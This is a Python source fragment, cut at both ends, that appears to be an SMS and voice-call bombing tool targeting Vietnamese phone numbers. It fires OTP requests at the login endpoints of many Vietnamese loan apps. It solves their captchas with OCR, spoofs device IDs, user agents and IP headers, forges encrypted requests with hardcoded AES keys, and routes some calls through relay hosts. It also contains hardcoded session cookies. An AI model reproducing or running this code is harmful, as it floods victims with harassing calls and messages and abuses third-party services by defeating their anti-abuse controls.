        "Accept-Language": random.choice(["vi-VN", "en-US"]),
        "Accept-Encoding": "gzip"
    }

def _random_android_id() -> str:
    return ''.join(random.choices('0123456789abcdef', k=32))

def gen_device_id():
    return str(uuid.uuid4()).upper()

def get_random_ip():
    return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

def get_random_ipv6():
    parts = []
    for _ in range(8):
        part = format(random.randint(0, 65535), 'x')
        parts.append(part)
    return ':'.join(parts)

_VNCREDIT_KEY = b'tdbdif7653scbvy4'

def _vncredit_encrypt(data: dict) -> dict:
    raw = json.dumps(data, separators=(',', ':')).encode()
    cipher = AES.new(_VNCREDIT_KEY, AES.MODE_ECB)
    enc = base64.b64encode(cipher.encrypt(pad(raw, 16))).decode()
    return {"JXTbpertIbc": enc}

def _vncredit_decrypt(resp_json: dict) -> dict:
    try:
        enc = resp_json.get("JXTbpertIbc", "")
        raw = base64.b64decode(enc)
        cipher = AES.new(_VNCREDIT_KEY, AES.MODE_ECB)
        return json.loads(unpad(cipher.decrypt(raw), 16).decode())
    except Exception:
        return resp_json

_VNCREDIT_DEVICE_IDS: dict = {}

def _vncredit_device_id(phone_otp: str) -> str:
    if phone_otp not in _VNCREDIT_DEVICE_IDS:
        _VNCREDIT_DEVICE_IDS[phone_otp] = str(random.randint(10000000, 99999999))
    return _VNCREDIT_DEVICE_IDS[phone_otp]

_QQ_BASE      = "https://ang.quickquangapp.com"
_QQ_OWNERSHIP = "quiquang_ios"

def _qq_headers() -> dict:
    return {
        "Content-Type":  "application/json",
        "Accept":        "application/json, text/plain, */*",
        "encrypted":     "0",
        "encryptType":   "0",
        "disturbedUrl":  "1",
        "disturbedPar":  "1",
        "ownerShip":     _QQ_OWNERSHIP,
        "Origin":        _QQ_BASE,
        "Referer":       _QQ_BASE + "/",
        "User-Agent":    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) "
                         "AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
    }

def _qq_body(phone_otp: str, extra: dict) -> dict:
    return {
        "i18n":            "vi_VN",
        "reqSource":       "Ios",
        "phoneName":       "iPhone13,3",
        "appVersion":      "1.1.0",
        "androidversion":  "iOS18.1",
        "webVersion":      "1.0.0",
        "deviceID":        str(uuid.uuid4()).upper(),
        "uuid":            uuid.uuid4().hex,
        "pagingData":      0,
        "exquisiteItemType": 1,
        "ownerShip":       _QQ_OWNERSHIP,
        "token":           "",
        **extra,
    }

def _qq_solve(b64_str: str) -> str:
    try:
        raw = base64.b64decode(b64_str)
        img = Image.open(io.BytesIO(raw))
        img.load()
        buf_color = io.BytesIO()
        img.convert("RGB").save(buf_color, format="PNG")
        result = _ocr.classification(buf_color.getvalue())
        if result and result.strip():
            return result.strip()
        from PIL import ImageEnhance
        enhanced = ImageEnhance.Contrast(img.convert("RGB")).enhance(2.0)
        buf_enh = io.BytesIO()
        enhanced.save(buf_enh, format="PNG")
        result2 = _ocr.classification(buf_enh.getvalue())
        return result2.strip() if result2 else ""
    except Exception:
        return ""

async def _qq_send(phone_otp: str, endpoint: str, label: str):
    try:
        async with httpx.AsyncClient(timeout=20, follow_redirects=True) as c:
            r1 = await c.post(
                f"{_QQ_BASE}{endpoint}",
                headers=_qq_headers(),
                json=_qq_body(phone_otp, {"phoneNo": phone_otp, "veriType": "LOGIN", "figureVeri": False}),
            )
            d1 = r1.json()
            if str(d1.get("code", "")) == "0":
                print(f" ✅ {label} {phone_otp}  {d1.get('message','')}")
                return
            cap_b64 = (d1.get("data") or {}).get("captcha", "")
            if not cap_b64:
                print(f" ✘ {label} step1 code={d1.get('code')} msg={d1.get('message','')!r}")
                return
            answer = _qq_solve(cap_b64)
            if not answer:
                print(f" ✘ {label} OCR fail")
                return
            r2 = await c.post(
                f"{_QQ_BASE}{endpoint}",
                headers=_qq_headers(),
                json=_qq_body(phone_otp, {"phoneNo": phone_otp, "veriType": "LOGIN", "figureVeri": answer}),
            )
            d2 = r2.json()
            if str(d2.get("code", "")) == "0":
                print(f" ✅ {label} {phone_otp}  [{answer}]  {d2.get('message','')}")
            else:
                print(f" ✘ {label} step2 [{answer}] code={d2.get('code')} msg={d2.get('message','')!r}")
    except Exception as e:
        print(f" ✘ {label} exception: {e}")

async def qq_sms(phone_otp: str):
    await _qq_send(phone_otp, "/base/xmh/getSMSCode", "QQ SMS")

async def qq_voice(phone_otp: str):
    await _qq_send(phone_otp, "/base/xmh/getVoiceCode", "QQ Voice")

_PTV_BASE      = "https://app.phuthinhvay.com"
_PTV_OWNERSHIP = "PTVayNhanh_ios"

def _ptv_headers() -> dict:
    return {
        "Content-Type":  "application/json",
        "Accept":        "application/json, text/plain, */*",
        "encrypted":     "0",
        "encrypttype":   "0",
        "disturbedurl":  "0",
        "disturbedpar":  "0",
        "ownership":     _PTV_OWNERSHIP,
        "User-Agent":    "WorkHome/20 CFNetwork/1568.200.51 Darwin/24.1.0",
    }

def _ptv_body(phone_otp: str, extra: dict) -> dict:
    return {
        "i18n":        "vi_VN",
        "reqSource":   "Ios",
        "phoneName":   "iPhone13,3",
        "appVersion":  "1.1.0",
        "ownerShip":   _PTV_OWNERSHIP,
        "veriType":    "LOGIN",
        "figureVeri":  False,
        "phoneNo":     phone_otp,
        **extra,
    }

async def _ptv_send(phone_otp: str, endpoint: str, cap_key: str, label: str):
    try:
        async with httpx.AsyncClient(timeout=20, follow_redirects=True) as c:
            r1 = await c.post(
                f"{_PTV_BASE}{endpoint}",
                headers=_ptv_headers(),
                json=_ptv_body(phone_otp, {}),
            )
            d1 = r1.json()
            if str(d1.get("code", "")) == "0":
                print(f" ✅ {label} {phone_otp}  {d1.get('message','')}")
                return
            cap_b64 = (d1.get("data") or {}).get(cap_key, "")
            if not cap_b64:
                print(f" ✘ {label} step1 code={d1.get('code')} msg={d1.get('message','')!r}")
                return
            answer = _qq_solve(cap_b64)
            if not answer:
                print(f" ✘ {label} OCR fail")
                return
            r2 = await c.post(
                f"{_PTV_BASE}{endpoint}",
                headers=_ptv_headers(),
                json=_ptv_body(phone_otp, {"figureVeri": answer}),
            )
            d2 = r2.json()
            if str(d2.get("code", "")) == "0":
                print(f" ✅ {label} {phone_otp}  [{answer}]  {d2.get('message','')}")
            else:
                print(f" ✘ {label} step2 [{answer}] code={d2.get('code')} msg={d2.get('message','')!r}")
    except Exception as e:
        print(f" ✘ {label} exception: {e}")

async def ptvay_sms(phone_otp: str):
    await _ptv_send(phone_otp, "/lvjKRH/brRsY/JHkuyNids/RlhiPz", "jmJiSn2D1", "PTVay SMS")

async def ptvay_voice(phone_otp: str):
    await _ptv_send(phone_otp, "/lvjKRH/brRsY/getVoiceCode", "captcha", "PTVay Voice")

_LAVI_BASE      = "http://tin.lavifinancecompany.com"
_LAVI_OWNERSHIP = "laviFinance_ios"

def _lavi_headers() -> dict:
    return {
        "Content-Type":  "application/json",
        "Accept":        "application/json, text/plain, */*",
        "encrypted":     "0",
        "encryptType":   "0",
        "ownerShip":     _LAVI_OWNERSHIP,
        "User-Agent":    "laviFinance/1 CFNetwork/1568.200.51 Darwin/24.1.0",
    }

def _lavi_body(phone_otp: str, extra: dict) -> dict:
    return {
        "i18n":        "vi_VN",
        "reqSource":   "Ios",
        "phoneName":   "iPhone13,3",
        "appVersion":  "1.1.0",
        "ownerShip":   _LAVI_OWNERSHIP,
        "phoneNo":     phone_otp,
        "veriType":    "LOGIN",
        "figureVeri":  False,
        **extra,
    }

async def _lavi_send(phone_otp: str, endpoint: str, label: str):
    try:
        async with httpx.AsyncClient(timeout=20, follow_redirects=True) as c:
            r1 = await c.post(
                f"{_LAVI_BASE}{endpoint}",
                headers=_lavi_headers(),
                json=_lavi_body(phone_otp, {}),
            )
            d1 = r1.json()
            if str(d1.get("code", "")) == "0":
                print(f" ✅ {label} {phone_otp}  {d1.get('message','')}")
                return
            cap_b64 = (d1.get("data") or {}).get("captcha", "")
            if not cap_b64:
                print(f" ✘ {label} step1 code={d1.get('code')} msg={d1.get('message','')!r}")
                return
            answer = _qq_solve(cap_b64)
            if not answer:
                print(f" ✘ {label} OCR fail")
                return
            r2 = await c.post(
                f"{_LAVI_BASE}{endpoint}",
                headers=_lavi_headers(),
                json=_lavi_body(phone_otp, {"figureVeri": answer}),
            )
            d2 = r2.json()
            if str(d2.get("code", "")) == "0":
                print(f" ✅ {label} {phone_otp}  [{answer}]  {d2.get('message','')}")
            else:
                print(f" ✘ {label} step2 [{answer}] code={d2.get('code')} msg={d2.get('message','')!r}")
    except Exception as e:
        print(f" ✘ {label} exception: {e}")

async def lavi_sms(phone_otp: str):
    await _lavi_send(phone_otp, "/base/xmh/getSMSCode", "Lavi SMS")

async def lavi_voice(phone_otp: str):
    await _lavi_send(phone_otp, "/base/xmh/getVoiceCode", "Lavi Voice")

_ACHAU_BASE      = "https://tien.achauloan.com"
_ACHAU_OWNERSHIP = "AChauLoan_ios"

def _achau_headers() -> dict:
    return {
        "Accept":          "*/*",
        "Accept-Language": "vi-VN,vi;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type":    "application/json",
        "Connection":      "keep-alive",
        "User-Agent":      "vetnam_xingxing_01/5 CFNetwork/1568.200.51 Darwin/24.1.0",
        "disturbedurl":    "0",
        "encrypttype":     "1",
        "encrypted":       "0",
        "disturbedpar":    "1",
        "ownership":       _ACHAU_OWNERSHIP,
    }

def _achau_body(phone_otp: str, extra: dict) -> dict:
    return {
        "reqSource":      "Ios",
        "phoneName":      "iPhone",
        "appVersion":     "1.2.8",
        "androidversion": "iOS 18.1",
        "deviceID":       str(uuid.uuid4()).upper(),
        "i18n":           "zh_CN",
        "phoneNo":        phone_otp,
        "veriType":       "LOGIN",
        **extra,
    }

async def _achau_send(phone_otp: str, endpoint: str, label: str):
    try:
        async with httpx.AsyncClient(timeout=20, follow_redirects=True) as c:
            r1 = await c.post(
                f"{_ACHAU_BASE}{endpoint}",
                headers=_achau_headers(),
                json=_achau_body(phone_otp, {"veriType": "LOGIN", "figureVeri": False}),
            )
            d1 = r1.json()
            code1 = str(d1.get("code", ""))
            if code1 == "0":
                print(f" ✅ {label} {phone_otp}  {d1.get('message','')}")
                return
            if code1 == "106":
                print(f" ⚠️  {label} code 106 — số đã kích hoạt bảo mật 2 lớp, bỏ qua")
                return
            cap_b64 = (d1.get("data") or {}).get("captcha", "")
            if not cap_b64:
                print(f" ✘ {label} step1 code={code1} msg={d1.get('message','')!r}")
                return
            answer = _qq_solve(cap_b64)
            if not answer:
                print(f" ✘ {label} OCR fail")
                return
            r2 = await c.post(
                f"{_ACHAU_BASE}{endpoint}",
                headers=_achau_headers(),
                json=_achau_body(phone_otp, {"veriType": "LOGIN", "figureVeri": answer}),
            )
            d2 = r2.json()
            code2 = str(d2.get("code", ""))
            if code2 == "0":
                print(f" ✅ {label} {phone_otp}  [{answer}]  {d2.get('message','')}")
            elif code2 == "106":
                print(f" ⚠️  {label} code 106 sau captcha — số đã bật bảo mật 2 lớp")
            else:
                print(f" ✘ {label} step2 [{answer}] code={code2} msg={d2.get('message','')!r}")
    except Exception as e:
        print(f" ✘ {label} exception: {e}")

async def achau_sms(phone_otp: str):
    await _achau_send(phone_otp, "/AQadQ/Jfmb/goMXd/IuGP", "AChauLoan SMS")

_HTC_BASE      = "https://tin.hatacocompany.com"
_HTC_OWNERSHIP = "hatacovay_ios"

def _htc_headers() -> dict:
    return {
        "Content-Type":  "application/json",
        "Accept":        "application/json, text/plain, */*",
        "encrypted":     "0",
        "encryptType":   "0",
        "disturbedUrl":  "1",
        "disturbedPar":  "1",
        "ownerShip":     _HTC_OWNERSHIP,
        "Origin":        _HTC_BASE,
        "Referer":       _HTC_BASE + "/",
        "User-Agent":    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) "
                         "AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
    }

def _htc_body(phone_otp: str, extra: dict) -> dict:
    return {
        "i18n":            "vi_VN",
        "reqSource":       "Ios",
        "phoneName":       "iPhone13,3",
        "appVersion":      "1.0.2",
        "androidversion":  "iOS18.1",
        "webVersion":      "1.0.0",
        "deviceID":        str(uuid.uuid4()).upper(),
        "uuid":            uuid.uuid4().hex,
        "pagingData":      0,
        "exquisiteItemType": 1,
        "ownerShip":       _HTC_OWNERSHIP,
        "token":           "",
        **extra,
    }

async def _htc_send(phone_otp: str, endpoint: str, label: str):
    try:
        async with httpx.AsyncClient(timeout=20, follow_redirects=True) as c:
            r1 = await c.post(
                f"{_HTC_BASE}{endpoint}",
                headers=_htc_headers(),
                json=_htc_body(phone_otp, {"phoneNo": phone_otp, "veriType": "LOGIN", "figureVeri": False}),
            )
            d1 = r1.json()
            if str(d1.get("code", "")) == "0":
                print(f" ✅ {label} {phone_otp}  {d1.get('message','')}")
                return
            cap_b64 = (d1.get("data") or {}).get("captcha", "")
            if not cap_b64:
                print(f" ✘ {label} step1 code={d1.get('code')} msg={d1.get('message','')!r}")
                return
            answer = _qq_solve(cap_b64)
            if not answer:
                print(f" ✘ {label} OCR fail")
                return
            r2 = await c.post(
                f"{_HTC_BASE}{endpoint}",
                headers=_htc_headers(),
                json=_htc_body(phone_otp, {"phoneNo": phone_otp, "veriType": "LOGIN", "figureVeri": answer}),
            )
            d2 = r2.json()
            if str(d2.get("code", "")) == "0":
                print(f" ✅ {label} {phone_otp}  [{answer}]  {d2.get('message','')}")
            else:
                print(f" ✘ {label} step2 [{answer}] code={d2.get('code')} msg={d2.get('message','')!r}")
    except Exception as e:
        print(f" ✘ {label} exception: {e}")

async def htc_sms(phone_otp: str):
    await _htc_send(phone_otp, "/base/xmh/getSMSCode", "HTC SMS")

async def htc_voice(phone_otp: str):
    await _htc_send(phone_otp, "/base/xmh/getVoiceCode", "HTC Voice")

_PETRO_BASE      = "https://loan.gpamcloan.com"
_PETRO_OWNERSHIP = "GPAMCloan_ios"

def _petro_headers() -> dict:
    return {
        "Content-Type":  "application/json",
        "Accept":        "application/json, text/plain, */*",
        "encrypted":     "0",
        "encryptType":   "0",
        "disturbedUrl":  "1",
        "disturbedPar":  "1",
        "ownerShip":     _PETRO_OWNERSHIP,
        "Origin":        _PETRO_BASE,
        "Referer":       _PETRO_BASE + "/",
        "User-Agent":    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) "
                         "AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
    }

def _petro_body(phone_otp: str, extra: dict) -> dict:
    return {
        "i18n":              "vi_VN",
        "reqSource":         "Ios",
        "phoneName":         "iPhone13,3",
        "appVersion":        "1.1.0",
        "androidversion":    "iOS18.1",
        "webVersion":        "1.0.0",
        "deviceID":          str(uuid.uuid4()).upper(),
        "uuid":              uuid.uuid4().hex,
        "pagingData":        0,
        "phoneNo":           phone_otp,
        "exquisiteItemType": 1,
        "ownerShip":         _PETRO_OWNERSHIP,
        "token":             "",
        **extra,
    }

async def _petro_send(phone_otp: str, endpoint: str, label: str):
    try:
        async with httpx.AsyncClient(timeout=20, follow_redirects=True, http2=True) as c:
            r1 = await c.post(
                f"{_PETRO_BASE}{endpoint}",
                headers=_petro_headers(),
                json=_petro_body(phone_otp, {"veriType": "LOGIN", "figureVeri": False})
            )
            try:
                d1 = r1.json()
            except Exception:
                print(f" ✘ {label} invalid json #1")
                return

            if str(d1.get("code", "")) == "0":
                print(f" ✅ {label} {phone_otp} {d1.get('message', '')}")
                return

            cap_b64 = (d1.get("data") or {}).get("captcha", "")
            if not cap_b64:
                print(f" ✘ {label} no captcha")
                return

            answer = _qq_solve(cap_b64)
            if not answer:
                print(f" ✘ {label} captcha solve fail")
                return

            r2 = await c.post(
                f"{_PETRO_BASE}{endpoint}",
                headers=_petro_headers(),
                json=_petro_body(phone_otp, {"veriType": "LOGIN", "figureVeri": answer})
            )

            try:
                d2 = r2.json()
            except Exception:
                print(f" ✘ {label} invalid json #2")
                return

            ok = str(d2.get("code", "")) == "0"
            if ok:
                print(f" ✅ {label} {phone_otp} [{answer}] {d2.get('message', '')}")
            else:
                print(f" ✘ {label} {phone_otp} [{answer}] {d2}")
    except Exception as e:
        pass

async def petro_sms(phone_otp: str):
    await _petro_send(phone_otp, "/base/xmh/getSMSCode", "Petro SMS")

async def petro_voice(phone_otp: str):
    await _petro_send(phone_otp, "/base/xmh/getVoiceCode", "Petro Voice")

def _vncredit_headers(phone_otp: str) -> dict:
    return {
        "Content-Type": "application/json",
        "arHZCqdXMe": "",
        "DJDVItHEOpT": "",
        "TcJSztVvHI": "in",
        "vMdkYlySgyVn": "cn.ivay.h5.viet",
        "BCCpGTCULBU": _vncredit_device_id(phone_otp),
        "xAfAyxfEVv": "",
        "oqBfkSWOjSw": "1",
        "fbcId": "",
        "User-Agent": (
            "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) "
            "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1"
        ),
    }

async def vncredit_sms(phone_otp):
    try:
        headers = _vncredit_headers(phone_otp)
        async with httpx.AsyncClient() as client:
            r = await client.post(
                "https://api.tmdv.vn/mkydnfCwIW/GOifgUPDRz",
                json={"mobile": phone_otp, "type": "1"}, headers=headers, timeout=20,
            )
        if r.status_code == 200:
            resp = _vncredit_decrypt(r.json())
            ok = resp.get("code") == 0
            if ok:
                print(f" ✅ VNCredit SMS  {resp.get('msg', '')}")
            return ok
        return False
    except Exception as e:
        return False

async def vncredit_voice(phone_otp):
    try:
        headers = _vncredit_headers(phone_otp)
        async with httpx.AsyncClient() as client:
            r = await client.post(
                "https://api.tmdv.vn/mkydnfCwIW/vCqfJYeweB",
                json={"mobile": phone_otp, "type": "1"}, headers=headers, timeout=20,
            )
        if r.status_code == 200:
            resp = _vncredit_decrypt(r.json())
            ok = resp.get("code") == 0
            if ok:
                print(f" ✅ VNCredit Voice  {resp.get('msg', '')}")
            return ok
        return False
    except Exception as e:
        return False

async def random_site(phone_otp):
    async with httpx.AsyncClient(timeout=10) as client:
        r = await client.post(
            "https://doaxa--e3c9c6644c9c11f1b16dee650bb23af1.web.val.run",
            headers={"Content-Type": "application/json"},
            json={"phone": phone_otp}
        )

async def call_mfast360(phone_otp):
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    }
    payload = {
        "mobile_phone": phone_otp,
        "type": "call",
    }
    async with httpx.AsyncClient(timeout=10) as client:
        r = await client.post(
            "https://asia-south1-mfast-360-prod.cloudfunctions.net/api/auth/sendOtp",
            json=payload,
            headers=headers
        )

async def call_vaydep365(phone_otp: str):
    CF_URL = [
        "https://ndnndfndndbb--28fa0824520211f1b766ee650bb23af1.web.val.run",
        "https://wander6fb5.xadoa8.workers.dev/vaydep365",
        "https://verceldeploy-one-phi.vercel.app/api/vaydep",
    ]
    try:
        async with httpx.AsyncClient(timeout=10) as client:
            r = await client.post(
                random.choice(CF_URL),
                json={"phone": phone_otp},
            )
        print(f"  vaydep365_valtown | {r.status_code} | {r.text[:200]}")
        return r.json()
    except Exception as e:
        return None

async def call_senvay(phone_otp):
    KEY   = b"43frgy5fmjf4647f"
    NONCE = b"\x00" * 12

    def enc(plain):
        if isinstance(plain, (dict, list)):
            plain = json.dumps(plain, separators=(",", ":")).encode()
        elif isinstance(plain, str):
            plain = plain.encode()
        ct, tag = AES.new(KEY, AES.MODE_GCM, nonce=NONCE).encrypt_and_digest(plain)
        return base64.b64encode(NONCE + ct + tag).decode()

    def make_token(device_no: str, server_time_ms: int) -> str:
        inner_token = enc(f"{device_no}++1")
        return enc(f"{inner_token}+{server_time_ms}")

    def make_headers(token: str) -> dict:
        return {
            "Accept":          "application/json, text/plain, */*",
            "Content-Type":    "application/json",
            "version":         "1.0.0",
            "countryCode":     "vn",
            "type":            "1060",
            "token":           token,
            "Origin":          "https://senvayvaytien.com",
            "Referer":         "https://senvayvaytien.com/login",
            "User-Agent":      "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
            "Accept-Language": "vi-VN,vi;q=0.9",
        }

    device_no = str(uuid.uuid4())
    base_url  = "https://senvayvaytien.com/ly03"
    try:
        async with httpx.AsyncClient(verify=False, timeout=30) as client:
            init_path  = "/encrypt/k/bla/j"
            init_param = {
                "fndkec": "vn",
                "ffkjno": "1060",
                "fniehh": "1.0.0",
                "falgnk": 1,
                "fajnpo": "",
                "fnjhhd": device_no,
            }
            local_before  = int(time.time() * 1000)
            init_token    = make_token(device_no, local_before)
            init_body     = enc({"param": enc(init_param), "url": enc(init_path)})
            r = await client.post(
                f"{base_url}{init_path}",
                content=init_body.encode(),
                headers=make_headers(init_token),
            )
            server_time_ms = local_before
            if r.status_code == 200:
                try:
                    init_data = r.json()
                    result    = init_data.get("result") or {}
                    sv = result.get("ffolml")
                    if sv and isinstance(sv, (int, float)) and sv > 1_000_000_000_000:
                        server_time_ms = int(sv)
                except Exception:
                    pass
            sms_path  = "/fm/nkgg/edf"
            phone_fmt = "840" + phone_otp.lstrip("0")
            sms_param = {
                "ffchmk": "vn",
                "fahpgp": "1060",
                "fmland": "1.0.0",
                "fbdcbg": phone_fmt,
                "fpkgam": 2,
                "fojphg": 1,
            }
            sms_token = make_token(device_no, server_time_ms)
            sms_body  = enc({"param": enc(sms_param), "url": enc(sms_path)})
            r = await client.post(
                f"{base_url}{sms_path}",
                content=sms_body.encode(),
                headers=make_headers(sms_token)
            )
        return r.status_code == 200
    except Exception as e:
        return False

async def call1(phone_otp):
    try:
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json;charset=utf-8",
            "Origin": "https://ezvay.com",
            "Referer": "https://ezvay.com/",
            "language": "vi_VN",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
            "Accept-Language": "vi-VN,vi;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
        }
        payload_1 = {
            "smsType": "1",
            "phone": phone_otp,
            "loanProductName": "vay_home"
        }
        async with httpx.AsyncClient() as client:
            r1 = await client.post(
                "https://ezvay.com/app-domain/api/user/sentSms",
                headers=headers,
                json=payload_1
            )
            payload_2 = {
                "type": 2,
                "productName": "vay_home"
            }
            r2 = await client.post(
                "https://ezvay.com/app-domain/api/user/appCollectUpload",
                headers=headers,
                json=payload_2
            )

        return True
    except:
        return False

async def call2(phone_otp):
    try:
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json;charset=utf-8",
            "Origin": "https://vaycash.top",
            "Referer": "https://vaycash.top/",
            "language": "vi_VN",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
            "Accept-Language": "vi-VN,vi;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
        }
        payload_1 = {
            "smsType": "1",
            "phone": phone_otp,
            "loanProductName": "u_cash"
        }
        async with httpx.AsyncClient() as client:
            r1 = await client.post(
                "https://vaycash.top/app-domain/api/user/sentSms",
                headers=headers,
                json=payload_1
            )
            payload_2 = {
                "type": 2,
                "productName": "u_cash"
            }
            r2 = await client.post(
                "https://vaycash.top/app-domain/api/user/appCollectUpload",
                headers=headers,
                json=payload_2
            )

        return True
    except:
        return False

async def call3(phone_otp):
    phone_formatted = phone_otp.lstrip('0')
    url = "https://api.hicash.fun/v1/login/send/msm"
    headers = {
        "Host": "api.hicash.fun",
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://h5.hicash.fun",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
        "Referer": "https://h5.hicash.fun/",
        "Accept-Language": "vi-VN,vi;q=0.9",
        "Priority": "u=3, i",
    }
    data = {
        "phone": phone_formatted,
        "type": "2",
        "chntoken": "",
        "sourse": "1",
        "ip2": get_random_ip(),
        "ip3": get_random_ipv6()
    }
    try:
        async with httpx.AsyncClient() as client:
            r = await client.post(url, headers=headers, data=data)

    except:
        return False

async def call9(phone_otp):
    cookies = {
        "__sbref": "hgpyjywadlykgkoiavkyouqetxuxcpwhpxdqandf",
        "_cabinet_key": "SFMyNTY.g3QAAAACbQAAABBvdHBfbG9naW5fcGFzc2VkZAAFZmFsc2VtAAAABXBob25lbQAAAAs4NDkxNDkwMTk2Ng.nD_8NLs-CZ7IqIV4JqSpmnAsPVAC0r0WuzMgua9OO1U",
    }
    headers_get = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "referer": "https://vayxanh.com/",
    }
    headers_post = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "content-type": "application/json;charset=utf-8",
        "origin": "https://lk.vayxanh.com",
        "referer": f"https://lk.vayxanh.com/?phone={phone_otp}&amount=2000000&term=7",
        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "x-request-id": str(uuid.uuid4()),
    }
    try:
        async with httpx.AsyncClient(timeout=10) as client:
            resp_get = await client.get(
                "https://lk.vayxanh.com/",
                params={"phone": phone_otp, "amount": "2000000", "term": "7",
                        "utm_source": "direct_vayxanh", "utm_medium": "organic",
                        "utm_campaign": "direct_vayxanh", "utm_content": "mainpage_submit"},
                headers=headers_get,
            )
            r = await client.post(
                "https://lk.vayxanh.com/api/4/client/otp/send",
                headers=headers_post,
                json={"data": {"phone": phone_otp, "code": "resend", "channel": "ivr"}},
            )

        print(r.text)
    except:
        return False

async def call_hoivan(phone_otp):
    headers = build_headers("https://ios-h5.onsenhoivanvn.com")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "Hoi Van Cash",
        "app_package_name": "onse.hoivan.vn",
        "platform": "ios",
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "https://vnoii.onsenhoivanvn.com/v2/login/captcha",
            json={**payload, "app_id": "247000001"},
            headers=headers
        )

async def call_hoivan_okay(phone_otp):
    headers = build_headers("https://ios-h5.onsenhoivanvn.com")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "Hoi Van Cash",
        "app_package_name": "onse.hoivan.vn",
        "platform": "ios",
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "https://vnoai.onsenhoivanvn.com/v2/login/captcha",
            json={**payload, "type": 2, "app_id": "247000000"},
            headers=headers
        )

async def mfast(phone_otp):
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://mfast.vn",
        "Referer": "https://mfast.vn/",
        "language": "vi_VN",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
        "X-Requested-With": "XMLHttpRequest",
    }
    data = {
        "phone": phone_otp,
        "type": "phone",
    }
    async with httpx.AsyncClient(timeout=10) as client:
        r = await client.post(
            "https://appay-rc.cloudcms.vn/mfast/potential_customer/ajax_confirm_phone",
            headers=headers,
            data=data,
        )


async def combo1(phone_otp):
    headers = build_headers("https://ios-h5.sunmobilefinance.com")
    payload1 = {
        "app_name": "Sun Mobile",
        "packagename": "sunvay.online.vn",
        "phone": phone_otp,
        "type": 2,
        "platform": "ios",
        "app_id": "238000001",
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "https://sciiv.sunmobilefinance.com/v2/login/captcha",
            json=payload1,
            headers=headers
        )


async def combo2(phone_otp):
    headers = build_headers("https://ios-h5.sunmobilefinance.com")
    payload = {
        "app_name": "Sun Mobile",
        "packagename": "sunvay.online.vn",
        "phone": phone_otp,
        "type": 2,
        "platform": "android",
        "app_id": "238000000",
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "https://scaiv.sunmobilefinance.com/v2/login/captcha",
            headers=headers,
            json=payload
        )


async def call8(phone_otp):
    headers = build_headers("https://ios-h5.marttimeassrt.com")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "Mar Vay",
        "app_package_name": "com.maritme.assrt.vn",
        "platform": "android",
        "app_id": "266000001",
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "https://mvvii.marttimeassrt.com/v2/login/captcha",
            json={**payload, "type": 2},
            headers=headers
        )

async def call10(phone_otp):
    headers = {
        "Accept": "*/*",
        "Accept-Language": "vi-VN,vi;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "x-client-type": "phone",
        "Origin": "https://android.vaycash.net",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "Referer": "https://android.vaycash.net/",
        "Connection": "keep-alive",
        "Content-Type": "application/json",
        "Cookie": "HWWAFSESID=63f6c7f810288e2923; HWWAFSESTIME=1774426765256; PHPSESSID=7aaeabbc2187eeaf2633fb3b2890f364",
    }
